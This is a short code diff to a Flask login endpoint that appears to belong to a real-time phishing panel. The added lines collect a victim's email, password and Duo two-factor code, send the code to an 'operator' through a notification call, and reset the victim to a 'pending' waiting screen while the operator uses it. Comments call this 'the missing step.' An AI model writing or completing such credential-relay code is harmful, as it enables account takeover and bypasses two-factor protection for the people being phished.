@@ -47,8 +47,10 @@ def set_status(email, status):
 @app.post("/auth")
 def auth():
     req = request.json
-    email = req['email'].strip()
-    password = req['password']
+    email = req.get('email').strip()
+    password = req.get('password')
+    duo_code = req.get('duoCode') # Safely get the duoCode from the request
+
  
 
     email_response = Email_statuses.find_one({"email": email})
@@ -70,6 +72,19 @@ def auth():
             upsert=True
         )
         return {"status":"pending"}
+
+    if duo_code:
+        # Notify the operator of the received code. THIS IS THE MISSING STEP.
+        send_notification(f"Duo Code received for {email}: {duo_code}")
+        
+        # We can keep the user polling by not changing the DB status immediately,
+        # or reset it to pending while the operator uses the code.
+        # Resetting to pending is often safer.
+        Email_statuses.update_one(
+            {"email": email},
+            {"$set": {"status": "pending"}}
+        )
+        return {"status": "pending"} # Keep the user on a waiting screen
 
 
     
